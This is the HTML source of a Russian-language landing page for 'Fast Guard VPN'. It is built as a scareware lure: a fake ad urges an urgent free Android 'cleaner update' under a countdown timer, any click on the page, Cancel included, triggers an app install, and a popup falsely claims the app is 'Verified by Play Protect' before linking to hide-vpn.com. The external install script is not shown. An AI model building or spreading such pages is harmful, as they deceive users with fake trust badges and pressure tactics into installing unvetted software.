<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Fast Guard VPN</title>
    <!-- Манифест и цвета PWA -->
    <link rel="manifest" href="/manifest.json" />
    <meta name="theme-color" content="#a3a3a3" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="default" />
    <link rel="apple-touch-icon" href="/icons/app-icon-192.png" />
    <link rel="stylesheet" href="/land25.2.css" />
    <link rel="stylesheet" href="/pwa-install-popup1.0.css" />
    <script defer src="/pwa-install-v5.4.js"></script>
    <!-- Стили -->
  </head>
  <body>
    <div id="install-popup" class="install-popup hidden">
      <div class="install-popup-box">
        <div class="install-popup-icon-wrapper">
          <svg class="install-popup-loader" viewBox="0 0 100 100">
            <circle class="loader-path" cx="50" cy="50" r="45" fill="none" stroke="#0051AC" stroke-width="2"
                    stroke-linecap="round" stroke-dasharray="100 200" />
          </svg>
          <div class="install-popup-icon"></div>
        </div>
    
        <div class="install-popup-title">
          Fast Guard VPN
          <img src="/svg/shield.svg" alt="" class="install-popup-title-icon" />
        </div>
    
        <!-- Статус "Verified..." -->
        <div id="install-status-line" class="install-popup-subtitle">
          Verified by Play Protect
        </div>
    
        <!-- ✓ Installed -->
        <div id="installed-status-line" class="install-popup-subtitle hidden" style="display: flex; align-items: center; justify-content: center; gap: 6px;">
          <img src="/svg/checkmark.svg" alt="" style="height: 1em;" />
          <span style="color: #777;">Installed</span>
        </div>
    
        <!-- Загрузка -->
        <div id="install-popup-status" class="install-popup-status">Загрузка...</div>
    
        <!-- Кнопка открыть -->
        <a id="install-popup-open-link"
           href="intent://hide-vpn.com/#Intent;scheme=https;end"
           class="hidden">
           Открыть
        </a>
      </div>
    </div>
    <main id="container" class="main-container" onclick="installApp()">
      <div class="container">
        <div class="card">
    
          <div class="header">
            <span class="label">Реклама</span>
            <button class="close">&times;</button>
          </div>
    
          <h1 class="title">Рекомендуется обновить очистку для Android!</h1>
    
          <p class="text">
            Ваш Android может работать быстрее. Мы выпустили обновление очистки, которое подходит для всех устройств.
          </p>
          <p class="text">
            Обновите <strong>БЕСПЛАТНО</strong>, чтобы проверить ваш телефон прямо сейчас!
          </p>
    
          <p class="timer" id="timer">10:00</p>
    
          <div class="buttons">
            <button class="btn cancel">Отменить</button>
            <button class="btn update">Установить</button>
          </div>
        </div>
      </div>
    </main>
  <script>
    // начальное время в секундах
    let remainingSeconds = 600;
  
    const timerElement = document.getElementById('timer');
  
    function updateTimer() {
      const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, '0');
      const seconds = String(remainingSeconds % 60).padStart(2, '0');
      timerElement.textContent = `${minutes}:${seconds}`;
  
      if (remainingSeconds > 0) {
        remainingSeconds--;
      } else {
        clearInterval(timerInterval);
        timerElement.textContent = "00:00";
      }
    }
  
    const timerInterval = setInterval(updateTimer, 1000);
  </script>
  </body>
</html>
